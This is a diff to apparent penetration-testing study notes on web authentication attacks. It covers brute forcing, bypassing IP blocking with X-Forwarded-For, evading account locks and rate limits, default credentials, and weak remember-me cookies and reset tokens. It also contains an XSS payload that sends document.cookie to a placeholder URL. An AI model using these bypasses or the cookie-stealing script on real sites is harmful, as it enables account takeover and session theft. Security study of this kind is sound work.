@@ -1,6 +1,10 @@
 ### General Notes
 
-The process of verifying the identity of a user.
+Authentication vulnerabilities expose sensitive data and functionality.
+- Compromising a user account exposes that users data.
+- Compromising a high-privilege account exposes sensitive functions.
+
+Authentication is the process of verifying the identity of a user.
 * Knowledge Factors: Something you know, like a password.
 * Possession Factors: Something you have, like a security token.
 * Inherence Factors: Something you are, like biometrics.
@@ -8,13 +12,12 @@ The process of verifying the identity of a user.
 **Authentication** is verifying that a user is who they claim to be.
 **Authorization** is verifying whether a user is allowed to do something.
 
-> **MUST TEST FOR DEFAULT CREDENTIALS** [CIRT.net](https://www.cirt.net/passwords), [SCADA](https://github.com/scadastrangelove/SCADAPASS/tree/master), and [SecLists Default Credentials](https://github.com/danielmiessler/SecLists/tree/master/Passwords/Default-Credentials).
-
 ---
 ### Username-Password Attacks
 
 Against websites that have username-password based login mechanisms.
-##### Brute Force Attacks
+- The password is treated as the secret, and if an attacker obtains this secret for a user's account, then this account is compromised.
+#### Brute Force Attacks
 
 Trial and error attempts to guess valid user credentials while paying attention to:
 1. Status Codes: [[HTTP]] response codes can be observed. Sometimes the right username gives a different response than a wrong username.
@@ -24,18 +27,40 @@ Trial and error attempts to guess valid user credentials while paying attention 
 
 > Can be done via [[Burp Suite]] Intruder. To ensure 1 request is sent a time (if needed), go to resources pool tab and set the max concurrent requests to 1.
 
-If there is [[IP]] blocking, use the `X-Forwarded-For` [[HTTP]] header to change the IP address.
+###### IP Blocking
 
-User rate limiting occurs when making too many login attempts in a short period of time causing the [[IP]] to get blocked, and [[IP]] can be unblocked by:
+If there is [[IP]] blocking, use the `X-Forwarded-For` [[HTTP]] header to change the IP address.
+- This makes the request appear as if it originates from different [[IP]] addresses each time it is sent.
+
+Another faulty brute force protection mechanism for IP blocking is resetting the number of failed attempts for a single IP address if it successfully logs in.
+- An attacker can bypass this by logging in to their own account every few times to reset the incorrect login timer.
+
+###### Account Locking
+
+An account can get locked if there are multiple failed login attempts.
+- If an account is locked, then we now know that this username exists.
+
+Account locking can protect attackers from logging into a certain account, but it doesn't work when attackers want to log into any random account.
+- They can establish a list of valid usernames, then create a very short list of passwords for these usernames, and start an attack with hopefully 1 username matching a password.
+
+Account locking fails against *credential stuffing* attacks, which are attacks that involve a genuine dictionary of usernames and passwords from data breaches.
+- Since each username is attempted once, this defense mechanism is useless.
+
+###### User Rate Limiting
+
+User rate limiting occurs when making too many login attempts in a short period of time causing the [[IP]] to get blocked. The [[IP]] can be unblocked by:
 1. Manually by admin.
 2. Manually by user after completing a CAPTCHA.
 3. Automatically after a certain time period.
 
 > User rate limiting can be bypassed by trying multiple passwords in one login request. 
-##### Default Passwords
+
+#### Default Passwords
 
 An important element to try is default username-password combinations.
 - SecLists has a default password directory: `/seclists/Passwords/Default-Credentials` with many files.
+
+> **MUST TEST FOR DEFAULT CREDENTIALS** [CIRT.net](https://www.cirt.net/passwords), [SCADA](https://github.com/scadastrangelove/SCADAPASS/tree/master), and [SecLists Default Credentials](https://github.com/danielmiessler/SecLists/tree/master/Passwords/Default-Credentials).
 
 ###### Attack using [[ffuf]]
 
@@ -81,17 +106,16 @@ An attacker could login using his credentials, and then change his cookie to tha
 > Use the [[Burp Suite]] Turbo Intruder extension for increased speed in brute forcing verification codes. Can also be used to change macros, such as changing the session or logging in/out to avoid being blocked.
 
 ---
-
 ### Other Authentication Mechanisms
 
-### Keeping Users Logged In
+#### Keeping Users Logged In
 
 The 'remember me' feature is implemented by storing persistent [[Cookies]].
 - Access to these cookies is dangerous as it skips the entire login process.
 - These cookies can be generated via static value concatenation such as username, timestamp, password.
 
 If attacker can study their own cookie, they can figure out how these cookies are generated.
-- Some websites have [[Web Encoding]] such as Base64, which can be easily decrypted.
+- Some websites have [[Web Encoding]] such as `Base64`, which can be easily decrypted.
 - Using hashing functions is also not perfect as if the attacker identifies the hashing algorithm, they can brute force it using a wordlist using tools such as [[John the Ripper]].
 
 If attacker can't create an account, they can using [[Cross Site Scripting (XSS)]] steal another user's cookie and deduce how the cookie forms.
@@ -100,7 +124,7 @@ If attacker can't create an account, they can using [[Cross Site Scripting (XSS)
 <script>document.location='URL-to-send-to/'+document.cookie</script>
 ```
 
-### Resetting User Passwords
+#### Resetting User Passwords
 
 ##### Password Reset Example Sequence
 
@@ -122,7 +146,6 @@ http://website.com/reset-password?user=<victim>
 
 **Tokens**, which consists of secret data, are generated by the application when a user requests a password reset.
 - These tokens allow a users password to be changed. If they are vulnerable, or if there is a flaw in the password reset mechanism, they can be leveraged by attackers.
-###### Token Weaknesses
 
 Tokens can sometimes be generated in ways that are predictable.
 - If the attacker recognizes a pattern, these tokens can be stolen and predicted.
